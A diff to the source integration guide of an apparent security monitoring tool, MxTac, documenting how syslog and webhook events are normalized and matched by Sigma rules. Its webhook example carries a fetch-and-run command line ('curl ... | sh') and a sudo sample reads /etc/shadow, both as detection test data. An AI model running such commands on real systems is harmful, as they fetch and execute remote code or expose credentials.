@@ -1,16 +1,16 @@
 # Source integration guide
 
-MxTac has five source types. Three of them feed the detection pipeline.
+MxTac has five source types. All five feed the detection pipeline: their events are normalized to OCSF, stored, searchable in Hunt and evaluated by Sigma rules.
 
-| Type | Input | Normalized and evaluated by Sigma rules |
-|------|-------|------------------------------------------|
-| `wazuh` | Polls the Wazuh manager REST API | Yes |
-| `zeek` | Reads Zeek log files from a directory | Yes |
-| `suricata` | Reads the Suricata EVE JSON file | Yes |
-| `syslog` | Listens for syslog messages | No. Messages are accepted and then not processed |
-| `generic` | Receives JSON over HTTP (webhook) | No. Events are accepted and then not processed |
+| Type | Input | Normalizer |
+|------|-------|------------|
+| `wazuh` | Polls the Wazuh manager REST API | `services/normalizers/wazuh.py` |
+| `zeek` | Reads Zeek log files from a directory | `services/normalizers/zeek.py` |
+| `suricata` | Reads the Suricata EVE JSON file | `services/normalizers/suricata.py` |
+| `syslog` | Listens for syslog messages | `services/normalizers/syslog.py` |
+| `generic` | Receives JSON over HTTP (webhook) | `services/normalizers/webhook.py` |
 
-Syslog and webhook events are published to the internal queue, but no normalizer consumes them yet. They are not stored, do not appear in Hunt and do not produce detections.
+Normalizer paths are relative to `app/backend/app/`.
 
 ## Managing connectors
 
@@ -38,6 +38,8 @@ Create request:
 ```
 
 `config` holds the settings from the sections below. Enabled connectors start with the backend. Connector settings are stored in the database without encryption.
+
+A new installation has no connectors. The Sources page and the source status card on the Overview page stay empty until you add one.
 
 File-based connectors (Zeek, Suricata) read paths **inside the backend container**. Mount the log directory into the container, for example in `app/docker-compose.yml`:
 
@@ -89,7 +91,7 @@ The connector tails the EVE JSON file. On the first start it begins at the end o
 
 ## Syslog
 
-There are two ways to receive syslog. Both parse RFC 3164 and RFC 5424 messages. Neither feeds the detection pipeline yet.
+There are two ways to receive syslog. Both parse RFC 3164 and RFC 5424 messages and publish them to the same queue topic.
 
 **Syslog connector** (a connector of type `syslog`, UDP only):
 
@@ -109,7 +111,40 @@ There are two ways to receive syslog. Both parse RFC 3164 and RFC 5424 messages.
 | `SYSLOG_PROTOCOL` | `udp` | `udp`, `tcp` or `both` |
 | `SYSLOG_MAX_MESSAGE_SIZE` | `65535` | Maximum message size in bytes |
 
-The Compose files do not publish a syslog port. Add a port mapping to the `backend` service, for example `"514:1514/udp"`.
+The Compose files do not publish a syslog port. Add a port mapping to the `backend` service, for example `"514:1514/udp"` for the receiver.
+
+### How a syslog message is normalized
+
+| Syslog part | Normalized event |
+|-------------|------------------|
+| Timestamp | Event time. An RFC 3164 timestamp has no year and no time zone; the current year and UTC are assumed |
+| Host name in the message, sender address | `dst_endpoint.hostname`, `dst_endpoint.ip`. This is the host that shows on a detection |
+| Program name and process ID | `process.name`, `process.pid`, and the field `app_name` |
+| Severity 0 to 7 | OCSF severity: 0 to 2 critical, 3 high, 4 medium, 5 low, 6 and 7 informational |
+| Message text | Field `message` |
+| Facility | Fields `facility` and `facility_name` |
+
+Two message families get a more specific event class:
+
+| Message | Event class | Extracted |
+|---------|-------------|-----------|
+| SSH login results (`Failed password for ...`, `Accepted publickey for ...`, `Invalid user ...`) and PAM `authentication failure` | Authentication | User in `actor_user.name`, remote address and port in `src_endpoint` |
+| sudo command log (`alice : TTY=... ; COMMAND=/usr/bin/cat /etc/shadow`) | Process Activity | Command in `process.cmd_line`, program path in `process.path`, invoking user in `actor_user.name` |
+
+Every other message is stored as a Base Event. Rules can still match it through the `message` and `app_name` fields.
+
+Each event names the services `syslog`, the program name in lower case, and `auth` or `cron` for those facilities. Sigma rules with a `logsource.service` use these names.
+
+### Test message
+
+With a syslog port published on 514/udp:
+
+```bash
+echo "<38>$(date -u '+%b %e %H:%M:%S') web01 sshd[2211]: Failed password for root from 203.0.113.5 port 51122 ssh2" \
+  | nc -u -w1 localhost 514
+```
+
+The bundled rule "SSH Failed Password for Root" matches this message and creates a detection on the host `web01`. The event is stored with the time in the message, read as UTC.
 
 ## Generic webhook
 
@@ -130,10 +165,12 @@ The Compose files do not publish a syslog port. Add a port mapping to the `backe
      -H "X-MxTac-Source: custom-source" \
      -H "X-MxTac-Token: <the token>" \
      -H "Content-Type: application/json" \
-     -d '[{"timestamp": "2026-01-01T12:00:00Z", "message": "Suspicious login", "src_ip": "203.0.113.5"}]'
+     -d '[{"timestamp": "2026-01-01T12:00:00Z", "host": "web01", "user": "alice", "command_line": "curl http://198.51.100.7/x.sh | sh", "message": "Suspicious download"}]'
    ```
 
-   The response reports how many events were accepted: `{"accepted": 1, "rejected": 0}`.
+   The response has the status `202` and reports how many events were accepted: `{"accepted": 1, "rejected": 0}`. Array items that are not JSON objects are counted as rejected.
+
+   The bundled rule "Download Piped to Shell" matches this example and creates a detection on the host `web01`.
 
 | Limit | Value |
 |-------|-------|
@@ -141,13 +178,44 @@ The Compose files do not publish a syslog port. Add a port mapping to the `backe
 | Requests per source | 100 per minute |
 | Requests per client IP | 60 per minute (general write limit) |
 
-`POST /api/v1/ingest/test` checks the source name and token without sending events.
+`POST /api/v1/ingest/test` checks the source name and token without sending events. The **Sources** page has a "Send test event" card that posts a sample event from the browser.
 
-Accepted events are published to the topic `mxtac.raw.<source name>`. Nothing consumes that topic yet.
+### How a webhook event is normalized
+
+The normalizer looks for common field names. The first name of a row that is present is used.
+
+| Field names in the event | Normalized event |
+|--------------------------|------------------|
+| `timestamp`, `time`, `@timestamp` | Event time. ISO 8601, or epoch seconds or milliseconds. Without it, the time of receipt |
+| `host`, `hostname` | `dst_endpoint.hostname`, the host that shows on a detection |
+| `user`, `username`, `user_name` | `actor_user.name` |
+| `src_ip`, `source_ip` | `src_endpoint.ip` |
+| `dst_ip`, `dest_ip`, `destination_ip` | `dst_endpoint.ip` |
+| `src_port`, `source_port` | `src_endpoint.port` |
+| `dst_port`, `dest_port`, `destination_port` | `dst_endpoint.port` |
+| `process`, `process_name` | `process.name` |
+| `command_line`, `cmd_line`, `commandline`, `command` | `process.cmd_line` |
+| `pid`, `process_id` | `process.pid` |
+| `message`, `msg` | Field `message`, also used as the event summary |
+| `severity`, `level` | Severity. A number from 0 to 5, or a name such as `low`, `warning`, `high`, `critical` |
+| `id`, `event_id` | Event UID |
+| `os`, `os_name` | Operating system of the host. Sigma rules for a `product` such as `linux` or `windows` use it |
+| `service` | Service names for Sigma rules with a `logsource.service` |
+
+Every other top-level field is kept under its own name, and Sigma rules can reference it. The original object is stored with the event.
+
+| Event content | Event class |
+|---------------|-------------|
+| A process name or a command line | Process Activity |
+| A source and a destination address | Network Activity |
+| Anything else | Base Event |
+
+The name of the connector is stored in the field `source` of the event.
 
 ## Checking that events arrive
 
 1. Open the **Sources** page. A running connector shows its status, event count and the time of the last event.
-2. Open **Hunt** and search for recent events (Wazuh, Zeek and Suricata only).
-3. Check the backend log: `docker compose logs -f backend`.
-4. Check the metrics at `/metrics`, for example the counters for ingested events and dead-letter events.
+2. Open **Hunt** and run a search. Read the note on Hunt search under [Current limitations](architecture.md#current-limitations) first: with OpenSearch as the search backend, search without query text and filter by source.
+3. Open **Detections**. An event that matches an enabled rule creates a detection. The same rule on the same host creates at most one detection in 5 minutes.
+4. Check the backend log: `docker compose logs -f backend`.
+5. Check the metrics at `/metrics`, for example the counters for ingested events and dead-letter events.
